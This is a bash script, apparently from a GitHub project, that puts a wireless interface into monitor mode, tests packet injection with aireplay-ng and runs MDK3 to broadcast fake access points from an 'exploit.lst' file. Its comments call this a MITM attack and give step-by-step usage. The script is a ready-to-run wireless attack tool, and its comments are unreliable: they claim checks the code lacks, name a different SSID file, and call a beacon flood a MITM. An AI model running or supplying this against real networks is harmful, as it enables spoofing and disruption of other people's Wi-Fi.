#!/bin/bash

# Color Palette for Terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
VIOLET='\033[0;35m'
CYAN='\033[0;36m'
BLACK='\033[0;30m'
NC='\033[0m' # No Color

# Print the banner
#  ██████╗██████╗ ███████╗ █████╗ ████████╗███████╗    ███╗   ███╗██╗████████╗███╗   ███╗       █████╗ ██████╗
# ██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝    ████╗ ████║██║╚══██╔══╝████╗ ████║      ██╔══██╗██╔══██╗
# ██║     ██████╔╝█████╗  ███████║   ██║   █████╗      ██╔████╔██║██║   ██║   ██╔████╔██║█████╗███████║██████╔╝
# ██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝      ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║╚════╝██╔══██║██╔═══╝
# ╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗    ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║      ██║  ██║██║
#  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝      ╚═╝  ╚═╝╚═╝

# Abort if its not running on root user
printf "${YELLOW}Checking if you are running this script on su mode or not ${NC}"
if [[ $EUID -ne 0 ]]; then
   printf "${RED}This script must be run as root ${NC}"
   sleep 1
   exit
else
   sleep 1
fi

# Abort if its not running on linux machine
printf "${YELLOW}Checking if you are running this script on linux or not ${NC}"
if [[ $(uname -s) != "Linux" ]]; then
   printf "${RED}This script must be run on linux ${NC}"
   sleep 1
   exit
else
   sleep 1
fi

# Install MDK3 if not installed already
printf "${YELLOW}Checking if MDK3 is installed or not ${NC}"
if ! command -v mdk3 &>/dev/null; then
   printf "${RED}MDK3 is not installed ${NC}"
   printf "${YELLOW}Installing MDK3 ${NC}"
   apt-get install mdk3 -y
   sleep 1
else
   printf "${GREEN}MDK3 is already installed ${NC}"
   sleep 1
fi

# Check if packet injection is working or not on interface 0/1
printf "${YELLOW}Select the correct interface to test packet-injection ! (0/1) ${NC}"
read -r answer
if [[ $answer == 0 ]]; then
   printf "${RED}Starting the injection test on WLAN0... ${NC}"
   ifconfig wlan0 down
   iwconfig wlan0 mode monitor
   ifconfig wlan0 up
   iwconfig wlan0
   printf "${GREEN}Injecting packets on interface 0 ${NC}"
   aireplay-ng --test wlan0
   printf "${GREEN}Packet injection test done on interface 0 and its working fine ${NC}"
else
   printf "${RED}Starting the injection test on WLAN1... ${NC}"
   ifconfig wlan1 down
   iwconfig wlan1 mode monitor
   ifconfig wlan1 up
   iwconfig wlan1
   printf "${GREEN}Injecting packets on interface 1 ${NC}"
   aireplay-ng --test wlan1
   printf "${GREEN}Packet injection test done on interface 1 and its working fine ${NC}"
fi

# Run the MDK3 tool to create MITM AP using our created file.lst file (select the correct interface/wlan0/wlan1)
printf "${YELLOW}Select the correct interface to create FAKE_AP ! (0/1) ${NC}"
read -r answer
if [[ $answer == 0 ]]; then
   printf "${RED}Creating fake AP on interface 0 ${NC}"
   mdk3 wlan0 b -c 1 -f exploit.lst
   printf "${GREEN}Fake AP created on interface 0 ${NC}"
else
   printf "${RED}Creating fake AP on interface 1 ${NC}"
   mdk3 wlan1 b -c 1 -f exploit.lst
   printf "${GREEN}Fake AP created on interface 1 ${NC}"
fi

##
## Brief Explanation of the above code.
## Author Information
## License Information
## Usage of the script (how to use it)
## How to contribute to the project
## How to contact the author
##

##1
## This MITM attack is based on the MDK3 tool. MDK3 is a tool that can be used to create fake APs and MITM attacks. This script is just a wrapper around the MDK3 tool. It will check if the MDK3 tool is installed or not. If not, it will install it. Then it will check if the packet injection is working or not on the interface 0/1. If not, it will abort the script. Then it will ask the user to select the correct interface to create the fake AP. It will create the fake AP on the selected interface and will start the MITM attack. The fake AP will be created using the file.lst file. The file.lst file contains the SSID and the password of the fake AP. The user can change the SSID and the password of the fake AP by editing the file.lst file.

##2
## Author: KARTHIK LAL (karthik558)
## Author Website: https://karthiklal.live

##3
## This script is licensed under the GNU General Public License v3.0
## This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
## MITM ATTACK is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
## You should have received a copy of the GNU General Public License along with this program. If not, see <http://www.gnu.org/licenses/>.

##4
## Usage of the script (how to use it)
# ├── 1. Download the script from the github repository.
# ├── 2. Open the terminal and navigate to the directory where the script is downloaded.
# ├── 3. Run the script using the command "sudo ./start.sh" (without the quotes).
# ├── 4. The script will ask you to select the correct interface to test the packet injection.
# ├── 5. Select the correct interface to test the packet injection.
# ├── 6. The script will ask you to select the correct interface to create the fake AP.
# ├── 7. Select the correct interface to create the fake AP. (The fake AP will be created using the file.lst file)
# ├── 8. The script will create the fake AP and will start the MITM attack.
# ├── 9. The fake AP will be created using the SSID and the password of the file.lst file.
# └── 10. The user can change the SSID and the password of the fake AP by editing the file.lst file.

##5
## How to contribute to the project
# ├── 1. Fork the project.
# ├── 2. Clone the project to your local machine.
# ├── 3. Create a new branch.
# ├── 4. Make the changes.
# ├── 5. Commit the changes. (include a brief description of the changes)
# ├── 6. Push the changes to the remote repository.
# └── 7. Create a pull request.

##6
## How to contact the author
# ├── 1. Email: karthik.lal558@gmail.com | karthiklal@duck.com
# ├── 2. Website: https://karthiklal.live#contact
# ├── 3. Twitter: https://twitter.com/_karthik558
# ├── 4. Instagram: https://instagram.com/_karthiklal
# ├── 5. Facebook: https://facebook.com/karthik5588
# ├── 6. LinkedIn: https://linkedin.com/in/karthik558
# └── 7. GitHub: https://github.com/karthik558


